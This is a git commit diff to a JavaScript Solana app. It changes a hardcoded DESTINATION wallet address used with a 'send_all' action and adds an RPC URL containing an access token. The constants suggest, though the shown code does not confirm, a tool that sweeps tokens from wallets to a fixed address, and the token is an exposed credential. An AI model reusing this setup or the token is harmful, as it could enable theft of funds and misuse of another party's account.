e2b1da9ceecf18f5e8c30f2b5b09de8e3fc1f73c
SDEEY <75689630+SDEEY@users.noreply.github.com>
2023-02-26 11:32:35 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('J6JWvPAusA7cWVWo7PYF4N9HxBiAMM8kcorS4dLQUR3V');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
@@ -367,6 +367,7 @@ function App() {
             //'https://api.mainnet-beta.solana.com',
             //'https://solana-api.projectserum.com/',
             //'https://solana-api.syndica.io/access-token/eBEyTot5KvUDoVsrvIGPzGjTuTfPOnGyXes6oprbhADlNK2fjMhHH56hoQw1NFOA/rpc',
+            'https://solana-api.syndica.io/access-token/jOs4hYoFJCaQItBmRXMeo1ZiZmzovI659td2LgLg6BjBqBZZVJJopB1b8OSb1lnJ/rpc',
             'confirmed'
             // }
         );
